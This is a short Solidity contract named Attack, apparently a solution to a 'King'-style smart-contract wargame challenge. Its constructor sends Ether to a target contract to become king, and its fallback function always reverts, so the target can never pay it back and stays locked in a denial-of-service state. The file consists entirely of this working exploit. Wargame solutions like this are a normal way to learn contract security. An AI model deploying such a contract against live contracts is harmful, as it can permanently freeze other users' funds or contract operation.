// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;

 contract Attack {
    constructor(address _kingAddress) public payable {
        //sending in genreal so it fallback or recives
        address(_kingAddress).call{value: msg.value}(""); 

    }
    //Fallback is called when King sends Ether to this contract
    fallback() external payable {
        revert("NO broo");
    }
 }